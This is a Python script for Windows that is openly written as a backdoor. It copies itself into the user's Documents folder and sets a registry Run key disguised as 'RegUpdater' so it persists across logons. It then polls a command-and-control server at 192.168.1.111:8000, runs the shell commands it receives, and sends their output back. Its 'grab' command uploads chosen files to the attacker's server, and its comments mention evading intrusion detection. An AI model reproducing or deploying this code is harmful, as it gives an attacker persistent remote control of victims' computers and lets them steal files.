#!/usr/bin/python
import os
import shutil
import _winreg as wreg
import subprocess

import requests
import time
import random

# getting the cwd
path = os.getcwd().strip('\n')
# grabbing the username using a subprocess command for building the destination path
null, user = subprocess.check_output('set USERPROFILE', shell=True).split('=') # C:\Users\Administrador
# building the destination path (full path)
destination = user.strip('\n\r') + '\\Documents\\' + 'persistence.exe'

# check if file exists
if not os.path.exists(destination):
    # copying the putty client to the target machine (destination path)
    shutil.copyfile(path+'\persistence.exe', destination)
    # adding a Windows Registry key for the current user
    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
    # update the registry for execute the destination file without being administrator or (having admin privileges)
    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, destination)
    # close the write/update process
    key.Close()

# function for handling connections
def connect():
    while True:
        req = requests.get('http://192.168.1.111:8000')
        command = req.text # request body

        if 'terminate' in command:
            return 1 # this will break the loop
        elif 'grab' in command:
            grab,path = command.split(' -f ') # splitting the flag for the file
            if os.path.exists(path):
                url = 'http://192.168.1.111:8000/store' # POST url to send file
                files = {'file': open(path, 'rb')}
                r = requests.post(url, files=files)
            else:
                post_response = requests.post(url='http://192.168.1.111:8000', data='[-] Not able to find the file')
        else:
            CMD = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            post_response = requests.post(url="http://192.168.1.111:8000", data=CMD.stdout.read())
            post_response = requests.post(url="http://192.168.1.111:8000", data=CMD.stderr.read())

        # 3 seg cycle - avoiding IDS
        time.sleep(3)

# this will loop eternally and will manage a heartbeat for starting the connection every random secs
while True:
    try:
        if connect() == 1:
            break # this will break the loop for the terminate command
    except Exception as e:
        stime = random.randrange(1,10)
        time.sleep(stime)
        pass
